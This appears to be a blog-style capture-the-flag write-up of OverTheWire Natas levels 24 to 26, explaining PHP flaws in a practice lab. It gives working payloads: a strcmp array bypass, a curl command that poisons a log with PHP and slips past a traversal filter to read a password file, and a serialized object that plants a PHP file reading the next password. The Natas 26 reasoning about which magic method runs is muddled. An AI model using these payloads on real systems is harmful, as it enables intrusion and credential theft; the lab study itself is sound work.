<h1>natas24</h1>
<div id="content">

Password:
<form name="input" method="get">
    <input type="text" name="passwd" size=20>
    <input type="submit" value="Login">
</form>

<?php
    if(array_key_exists("passwd",$_REQUEST)){
        if(!strcmp($_REQUEST["passwd"],"<censored>")){
            echo "<br>The credentials for the next level are:<br>";
            echo "<pre>Username: natas25 Password: <censored></pre>";
        }
        else{
            echo "<br>Wrong!<br>";
        }
    }
    // morla / 10111
?>  
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
~~~~

Same deal as the last challenge, but with different rules for the password.

This time we've got a simple `strcmp`. How are we going to get around this without knowing exactly what the pasword is?

Let's take a look at `strcmp`'s documentation, maybe we can find something of use.

Oh, look! Here's something:

In the user-contributed notes, someone wrote:

~~~~
If you rely on strcmp for safe string comparisons, both parameters must be strings, the result is otherwise extremely unpredictable.
For instance you may get an unexpected 0, or return values of NULL, -2, 2, 3 and -3.

...

strcmp("foo", array()) => NULL + PHP Warning
~~~~

Interesting! So if we manage to pass this script an array, we'll get `strcmp` to return `NULL`, and since the script is inverting the result, the if statement gets `!NULL`, or `true`. That should give us our password!

But now the question is, how do we get an array into `$_REQUEST["passwd"]`? Luckily, these developers *still* haven't heard of sanitizing inputs, we could do something like: `http://natas24.natas.labs.overthewire.org/?passwd[]`. That should make `$_REQUEST["passwd"]` an empty array, and trigger our `!NULL` `strcmp` result.

Let's see if it works:

___

Password:
<form name="input" method="get">
    <input type="text" name="passwd" size=20>
    <input type="submit" value="Login">
</form>

<br />
<b>Warning</b>:  strcmp() expects parameter 1 to be string, array given in <b>/var/www/natas/natas24/index.php</b> on line <b>23</b><br />
<br>The credentials for the next level are:<br><pre>Username: natas25 Password: [censored]</pre>  
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>

___

Ha! There's that warning, telling us it's an array, and there's our credentials. We didn't even have to figure out the password to the challenge itself!


## Natas 25 🡆 Natas 26


~~~~
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src="http://natas.labs.overthewire.org/js/wechall-data.js"></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas25", "pass": "<censored>" };</script></head>
<body>
<?php
    // cheers and <3 to malvina
    // - morla

    function setLanguage(){
        /* language setup */
        if(array_key_exists("lang",$_REQUEST))
            if(safeinclude("language/" . $_REQUEST["lang"] ))
                return 1;
        safeinclude("language/en"); 
    }
    
    function safeinclude($filename){
        // check for directory traversal
        if(strstr($filename,"../")){
            logRequest("Directory traversal attempt! fixing request.");
            $filename=str_replace("../","",$filename);
        }
        // dont let ppl steal our passwords
        if(strstr($filename,"natas_webpass")){
            logRequest("Illegal file access detected! Aborting!");
            exit(-1);
        }
        // add more checks...

        if (file_exists($filename)) { 
            include($filename);
            return 1;
        }
        return 0;
    }
    
    function listFiles($path){
        $listoffiles=array();
        if ($handle = opendir($path))
            while (false !== ($file = readdir($handle)))
                if ($file != "." && $file != "..")
                    $listoffiles[]=$file;
        
        closedir($handle);
        return $listoffiles;
    } 
    
    function logRequest($message){
        $log="[". date("d.m.Y H::i:s",time()) ."]";
        $log=$log . " " . $_SERVER['HTTP_USER_AGENT'];
        $log=$log . " \"" . $message ."\"\n"; 
        $fd=fopen("/var/www/natas/natas25/logs/natas25_" . session_id() .".log","a");
        fwrite($fd,$log);
        fclose($fd);
    }
?>

<h1>natas25</h1>
<div id="content">
<div align="right">
<form>
<select name='lang' onchange='this.form.submit()'>
<option>language</option>
<?php foreach(listFiles("language/") as $f) echo "<option>$f</option>"; ?>
</select>
</form>
</div>

<?php  
    session_start();
    setLanguage();
    
    echo "<h2>$__GREETING</h2>";
    echo "<p align=\"justify\">$__MSG";
    echo "<div align=\"right\"><h6>$__FOOTER</h6><div>";
?>
<p>
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
~~~~

This is a bit more complicated... slightly owing to the fact that our only input is a language selection dropdown menu. But... I do see some file read/write operations going on, so it appears there is some serious potential for reading our password directory here. Oh no, wait! 

~~~~
// dont let ppl steal our passwords
if(strstr($filename,"natas_webpass")){
    logRequest("Illegal file access detected! Aborting!");
    exit(-1);
}
~~~~

They thought of that. We have to get very clever if we want to beat this...

What else do we have control over...

~~~~
function logRequest($message){
    $log="[". date("d.m.Y H::i:s",time()) ."]";
    $log=$log . " " . $_SERVER['HTTP_USER_AGENT'];
    $log=$log . " \"" . $message ."\"\n"; 
    $fd=fopen("/var/www/natas/natas25/logs/natas25_" . session_id() .".log","a");
    fwrite($fd,$log);
    fclose($fd);
}
~~~~

Hehehe... I spy an unfiltered `$_SERVER['HTTP_USER_AGENT'];`! We can put whatever we want in that header. But what would allow us to use this function as an attack vector?

Well, let's keep in mind our end goal: We want to read the `/etc/natas_webpass/natas26` file.

Now, let's keep in mind our limitation: We can't read `natas_webpass` from this script.

Hm... crazy idea, but what if we make a new script that can? It's writing whatever we give it for our User Agent header to a file, so we could throw some PHP in there for it to run, like `<?php include "/etc/natas_webpass/natas26"; ?>` But then, the question of "how to run it" arises...

There is an `include` statement up towards the middle, but that's behind the `safeinclude` function which prevents directory traversal.

We're stuck!

Wait wait wait... I just noticed something: they're replacing `../` with nothing... so what would happen if we applied that to a string like `.../...//`? Here's what it would remove: `.[../].[../]/`, leaving us with `../`

Haha! We *can* get past the directory traversal prevention! We just use `.../...//` instead of just `../`

Alright, I think we've got everything to carry out an attack. Let's get `<?php include "/etc/natas_webpass/natas26"; ?>` written to a log file, and set that log file to the `lang` variable so we can include it.

~~~~
curl --user natas25:[censored] --cookie PHPSESSID=6vitbapso7naujh44uno1t2so6 --header "User-Agent: <?php include '/etc/natas_webpass/natas26'; ?>" "http://natas25.natas.labs.overthewire.org?lang=.../...//.../...//.../...//.../...//.../...//var/www/natas/natas25/logs/natas25_6vitbapso7naujh44uno1t2so6.log"
~~~~

THAT is one heck of a cURL command. Should work, though. Let's try it.

~~~~
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src="http://natas.labs.overthewire.org/js/wechall-data.js"></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas25", "pass": [censored] };</script></head>
<body>

<h1>natas25</h1>
<div id="content">
<div align="right">
<form>
<select name='lang' onchange='this.form.submit()'>
<option>language</option>
<option>en</option><option>de</option></select>
</form>
</div>

[30.12.2018 17::03:33] [censored]
 "Directory traversal attempt! fixing request."
<br />
<b>Notice</b>:  Undefined variable: __GREETING in <b>/var/www/natas/natas25/index.php</b> on line <b>80</b><br />
<h2></h2><br />
<b>Notice</b>:  Undefined variable: __MSG in <b>/var/www/natas/natas25/index.php</b> on line <b>81</b><br />
<p align="justify"><br />
<b>Notice</b>:  Undefined variable: __FOOTER in <b>/var/www/natas/natas25/index.php</b> on line <b>82</b><br />
<div align="right"><h6></h6><div><p>
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>

~~~~

Heck yeah! We did it! That was definitely a challenging one. If they had only properly prevented directory traversal, they might've succeeded in foiling attackers.


## Natas 26 🡆 Natas 27


___
Draw a line:<br>
<form name="input" method="get">
X1<input type="text" name="x1" size=2>
Y1<input type="text" name="y1" size=2>
X2<input type="text" name="x2" size=2>
Y2<input type="text" name="y2" size=2>
<input type="submit" value="DRAW!">
</form> 


<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>

___

Line-drawing. Fun! But how do we hack it? Source time.

~~~~
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src="http://natas.labs.overthewire.org/js/wechall-data.js"></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas26", "pass": "<censored>" };</script></head>
<body>
<?php
    // sry, this is ugly as hell.
    // cheers kaliman ;)
    // - morla
    
    class Logger{
        private $logFile;
        private $initMsg;
        private $exitMsg;
      
        function __construct($file){
            // initialise variables
            $this->initMsg="#--session started--#\n";
            $this->exitMsg="#--session end--#\n";
            $this->logFile = "/tmp/natas26_" . $file . ".log";
      
            // write initial message
            $fd=fopen($this->logFile,"a+");
            fwrite($fd,$initMsg);
            fclose($fd);
        }                       
      
        function log($msg){
            $fd=fopen($this->logFile,"a+");
            fwrite($fd,$msg."\n");
            fclose($fd);
        }                       
      
        function __destruct(){
            // write exit message
            $fd=fopen($this->logFile,"a+");
            fwrite($fd,$this->exitMsg);
            fclose($fd);
        }                       
    }
 
    function showImage($filename){
        if(file_exists($filename))
            echo "<img src=\"$filename\">";
    }

    function drawImage($filename){
        $img=imagecreatetruecolor(400,300);
        drawFromUserdata($img);
        imagepng($img,$filename);     
        imagedestroy($img);
    }
    
    function drawFromUserdata($img){
        if( array_key_exists("x1", $_GET) && array_key_exists("y1", $_GET) &&
            array_key_exists("x2", $_GET) && array_key_exists("y2", $_GET)){
        
            $color=imagecolorallocate($img,0xff,0x12,0x1c);
            imageline($img,$_GET["x1"], $_GET["y1"], 
                            $_GET["x2"], $_GET["y2"], $color);
        }
        
        if (array_key_exists("drawing", $_COOKIE)){
            $drawing=unserialize(base64_decode($_COOKIE["drawing"]));
            if($drawing)
                foreach($drawing as $object)
                    if( array_key_exists("x1", $object) && 
                        array_key_exists("y1", $object) &&
                        array_key_exists("x2", $object) && 
                        array_key_exists("y2", $object)){
                    
                        $color=imagecolorallocate($img,0xff,0x12,0x1c);
                        imageline($img,$object["x1"],$object["y1"],
                                $object["x2"] ,$object["y2"] ,$color);
            
                    }
        }    
    }
    
    function storeData(){
        $new_object=array();

        if(array_key_exists("x1", $_GET) && array_key_exists("y1", $_GET) &&
            array_key_exists("x2", $_GET) && array_key_exists("y2", $_GET)){
            $new_object["x1"]=$_GET["x1"];
            $new_object["y1"]=$_GET["y1"];
            $new_object["x2"]=$_GET["x2"];
            $new_object["y2"]=$_GET["y2"];
        }
        
        if (array_key_exists("drawing", $_COOKIE)){
            $drawing=unserialize(base64_decode($_COOKIE["drawing"]));
        }
        else{
            // create new array
            $drawing=array();
        }
        
        $drawing[]=$new_object;
        setcookie("drawing",base64_encode(serialize($drawing)));
    }
?>

<h1>natas26</h1>
<div id="content">

Draw a line:<br>
<form name="input" method="get">
X1<input type="text" name="x1" size=2>
Y1<input type="text" name="y1" size=2>
X2<input type="text" name="x2" size=2>
Y2<input type="text" name="y2" size=2>
<input type="submit" value="DRAW!">
</form> 

<?php
    session_start();

    if (array_key_exists("drawing", $_COOKIE) ||
        (   array_key_exists("x1", $_GET) && array_key_exists("y1", $_GET) &&
            array_key_exists("x2", $_GET) && array_key_exists("y2", $_GET))){  
        $imgfile="img/natas26_" . session_id() .".png"; 
        drawImage($imgfile); 
        showImage($imgfile);
        storeData();
    }
    
?>

<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
~~~~


That's a bit of a mouthful. And... what the heck? We've got this big ol' `Logger` class up top that's never even being called. I think it's about time Kaliman and Morla sit down for a code review.

Anywho, let's continue down to the stuff that actually *is* being used. Scanning through, trying to find somewhere vulnerable... and, woah! Holy cow, look at this!

~~~~
if (array_key_exists("drawing", $_COOKIE)){
    $drawing=unserialize(base64_decode($_COOKIE["drawing"]));
    if($drawing)
        foreach($drawing as $object)
            if( array_key_exists("x1", $object) && 
                array_key_exists("y1", $object) &&
                array_key_exists("x2", $object) && 
                array_key_exists("y2", $object)){
            
                $color=imagecolorallocate($img,0xff,0x12,0x1c);
                imageline($img,$object["x1"],$object["y1"],
                        $object["x2"] ,$object["y2"] ,$color);
    
            }
}
~~~~

Hold on, hold on, hold on... They're taking the "drawing" cookie without filtering and turning it into an *object*?! ***Why?!?!***

Dang, Morla, this *is* ugly as hell.

So... Almost-criminally-negligent practices aside, let's think of how we can use this. Objects have `__constructor` functions that run when they're instantiated, and since we have full control over the object this script instantiates, we can make that `__constructor` do anything we want it to. Let's say, something like:

~~~~
<?php

class Logger
{
    private $logFile;
    private $initMsg;
    private $exitMsg;

    function __construct($file)
    {
        $this->initMsg = "Hakked";
        $this->exitMsg = "Natas27 Password: <?php echo file_get_contents('/etc/natas_webpass/natas27'); ?>";
        $this->logFile = "img/totally_not_a_trojan.php";
    }
}

?>
~~~~

This way, we can tap into that unused `Logger` class Morla so nicely left for us up there. We'll just overwrite that `exitMsg` with a call to read `/etc/natas_webpass/natas27`, and throw that "logfile" into a PHP script in the `img` directory... a directory we have access to, and should be able to run it from.

Oh, one quick caveat: it's expecting a serialized, base64_encoded representation of this object, so let's throw a couple more lines in here for ease of use:

~~~~
$obj = new Logger("hax");

file_put_contents("hackityhackhack.txt", urlencode(base64_encode(serialize($obj))));
~~~~

There, that should do it. I chose to use a file rather than stdout because newline characters are a pain.

Run it, and here's our object:

~~~~
Tzo2OiJMb2dnZXIiOjM6e3M6MTU6IgBMb2dnZXIAbG9nRmlsZSI7czoyODoiaW1nL3RvdGFsbHlfbm90X2FfdHJvamFuLnBocCI7czoxNToiAExvZ2dlcgBpbml0TXNnIjtzOjY6Ikhha2tlZCI7czoxNToiAExvZ2dlcgBleGl0TXNnIjtzOjgwOiJOYXRhczI3IFBhc3N3b3JkOiA8P3BocCBlY2hvIGZpbGVfZ2V0X2NvbnRlbnRzKCcvZXRjL25hdGFzX3dlYnBhc3MvbmF0YXMyNycpOyA%2FPiI7fQ%3D%3D
~~~~

Cool! Throw that in our `drawing` cookie, and let's get 'sploiting.

___
Draw a line:<br>
<form name="input" method="get">
X1<input type="text" name="x1" size=2>
Y1<input type="text" name="y1" size=2>
X2<input type="text" name="x2" size=2>
Y2<input type="text" name="y2" size=2>
<input type="submit" value="DRAW!">
</form> 

<img src="https://i.imgur.com/BGjB1Hh.png"><br />
<b>Fatal error</b>:  Cannot use object of type Logger as array in <b>/var/www/natas/natas26/index.php</b> on line <b>105</b><br />

___

Haha, darn right you can't use object of type Logger as array. But we don't care, because Logger got instantiated, and that means we should have a little something waiting for us at `http://natas26.natas.labs.overthewire.org/img/totally_not_a_trojan.php`!

Drum roll, please...

`Natas27 Password: [censored]`


## Natas 27 🡆 Natas 28


